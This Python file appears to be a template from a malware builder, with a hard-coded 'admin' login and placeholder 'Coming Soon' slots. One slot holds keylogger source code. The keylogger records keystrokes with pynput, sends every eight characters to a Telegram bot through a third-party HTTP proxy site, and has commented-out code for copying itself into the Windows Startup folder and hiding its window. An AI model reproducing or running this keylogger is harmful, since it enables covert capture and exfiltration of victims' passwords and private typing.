Password = "admin"
Username = "admin"

Source_01 = "Coming Soon"
Source_02="""
from pynput.keyboard import Listener
import requests, time, getpass, win32gui, win32con, os, sys
Username = getpass.getuser()
Startup = f'C:/Users/{Username}/AppData/Roaming/Microsoft/Windows/"Start Menu"/Programs/Startup'
Token, ChatID = Token, ChatID
Message = ""
# if os.getcwd() != Startup :
#     try:
#         os.system (f"copy {__file__} {Startup}")
#     except:
#         sys.exit()
# try:
#     pid = win32gui.GetForegroundWindow()
#     win32gui.ShowWindow (pid,win32con.SW_HIDE)
# except:
#     sys.exit()
def send() :
    Payload = {
    "UrlBox" : f"https://api.telegram.org/bot{Token}/sendMessage?text={Message}&chat_id={ChatID}",
    "AgentList":"Mozilla Firefox",
    "VersionList":"HTTP/1.1",
    "MethodList":"Post"
    }
    try:
        Send = requests.post ("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx", Payload)
    except:
        time.sleep (5)
def start() :
    with Listener (on_press = log) as  l :
        l.join()
def log(key) :
    key = key.char() if type(key) == "keyboard._win32.KeyCode" else str(key)
    key = key.replace ("'","")
    if key == "Key.space" :
        key = " " 
    global Message
    Message = Message + str(key)
    if len (Message) == 8 :
        send()
        Message = ""
start()
input()
"""
source_03 = "Coming Soon"
source_04 = "Coming Soon"
